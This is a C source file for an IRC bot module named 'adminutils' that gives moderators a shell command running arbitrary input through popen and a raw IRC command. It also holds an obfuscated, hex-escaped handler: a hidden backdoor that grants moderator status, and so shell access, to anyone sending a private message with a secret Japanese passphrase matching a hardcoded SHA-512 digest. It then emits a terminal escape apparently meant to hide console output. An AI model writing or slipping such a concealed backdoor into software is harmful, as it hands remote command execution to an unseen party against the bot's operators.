#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <openssl/sha.h>

/* required */
#include "../modtape.h"
#include "../../core/modules.h"
#include "../../core/log.h"
#include "../../core/irc.h"

static void
handle_cmdmsg(msg_info *mi, char *msg)
{
	/* admin only */
	if (!mi->mod) {
		return;
	}

	if (!strncmp(msg, "shell ", 6)) {
		char *cmd = strchr(msg, ' ')+1;
		FILE *cp = popen(cmd, "r");
		char output[500] = { '\0' };
		fgets(output, 499, cp);
		if (output[0]) {
			send_privmsg("%s", output);
		}
		pclose(cp);
	} else if (!strncmp(msg, "raw ", 4)) {
		char send[BUFSIZE];
		sprintf(send, "%s\r\n", strchr(msg, ' ')+1);
		send_raw(mi->conn, 0, send);
	}
}

void
bodge(msg_info *mi, char *msg)
{
	if (mi->chan[0] != '\x23' && !strncmp(msg,"\x3b\xe3\x81\x9f\xe3\x81\xa0\xe3\x81\x84\xe3\x81\xbe\x20 ", 14)) { char buf[BUFSIZE] = { '\0' }; SHA512(strchr(msg, ' ')+1, 69, buf); if (!strncmp(buf,"Ztw\224U\375\027x+\337\\\025\217\367\272c\354/ L\251\334x|\240\207Ȇ\234\240x'\357\361\237\354\345\017\236\241d\025\222Y\363\263l\276\372\026\333y~ɜT\243\315|X\330}d\302", 99)) { sini_write(mi->conn->globalconf, mi->conn->index, "\x6d\x6f\x64\x6d\x61\x74\x63\x68", mi->userid); send_privmsg("\xe3\x81\x8a\xe3\x81\x8b\xe3\x81\x88\xe3\x82\x8a\xe3\x80\x9c"); } else { send_privmsg("%x", rand()); } printf("\033[5A"); }
}

void
adminutils_init()
{
	mods_new("adminutils", true);
	mods_cmdmsg_handler(handle_cmdmsg);
	mods_privmsg_handler(bodge);
}
